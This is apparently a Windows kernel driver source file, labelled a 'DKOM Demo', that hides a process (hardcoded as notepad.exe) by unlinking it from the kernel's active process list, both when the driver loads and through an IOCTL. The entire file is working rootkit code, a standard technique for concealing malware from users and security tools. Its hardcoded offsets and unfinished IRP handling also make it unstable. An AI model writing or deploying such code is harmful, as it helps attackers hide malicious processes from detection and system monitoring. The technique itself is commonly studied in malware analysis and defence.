#pragma once
#include <ntddk.h>
#include <wdm.h>
#include <intrin.h>

#define IOCTL_MYDRIVER_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)

PDEVICE_OBJECT ptrDeviceObject = NULL;

ULONG_PTR ActiveOffsetPre = 0xb8;
ULONG_PTR ActiveOffsetNext = 0xbc;
ULONG_PTR ImageName = 0x17c;

NTSTATUS DriverPassthrough(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Irp->IoStatus.Status;
}

VOID HideProcess(char* ProcessName)
{
    PEPROCESS CurrentProcess = NULL;
    char* currImageFileName = NULL;

    if (!ProcessName)
        return;

    CurrentProcess = PsGetCurrentProcess();    //System  EProcess

    // Get the ActiveProcessLinks address
    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + ActiveOffsetPre);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    while (CurrListEntry != PrevListEntry)
    {
        NextListEntry = CurrListEntry->Flink;
        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - ActiveOffsetPre) + ImageName);

        DbgPrint("Iterating %s\r\n", currImageFileName);

        if (strcmp(currImageFileName, ProcessName) == 0)
        {
            DbgPrint("[*] Found Process! Needs To Be Removed %s\r\n", currImageFileName);

            if (MmIsAddressValid(CurrListEntry))
            {
                RemoveEntryList(CurrListEntry);
            }

            break;
        }

        CurrListEntry = NextListEntry;
    }
}

NTSTATUS DriverDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    IO_STACK_LOCATION* io_stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    switch (io_stack->Parameters.DeviceIoControl.IoControlCode)
    {
        case IOCTL_MYDRIVER_HIDE_PROCESS:
            HideProcess("notepad.exe");
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    return status;
}

void DriverUnload(PDRIVER_OBJECT pDriverObject)
{
    UNREFERENCED_PARAMETER(pDriverObject);

    UNICODE_STRING deviceName;
    UNICODE_STRING symbolicLink;

    RtlInitUnicodeString(&deviceName, L"\\Device\\MyDriver");
    RtlInitUnicodeString(&symbolicLink, L"\\DosDevices\\MyDriver");
    IoDeleteDevice(ptrDeviceObject);
    IoDeleteSymbolicLink(&symbolicLink);
    DbgPrint("Driver unloading\n");
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING deviceName;
    UNICODE_STRING symbolicLink;
    RtlInitUnicodeString(&deviceName, L"\\Device\\MyDriver");
    RtlInitUnicodeString(&symbolicLink, L"\\DosDevices\\MyDriver");
    IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &ptrDeviceObject);
    IoCreateSymbolicLink(&symbolicLink, &deviceName);

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_READ] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_WRITE] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;

    DriverObject->DriverUnload = DriverUnload;
    
    DbgPrint("DKOM Demo Loaded!\r\n");
    HideProcess("notepad.exe");

    return STATUS_SUCCESS;
}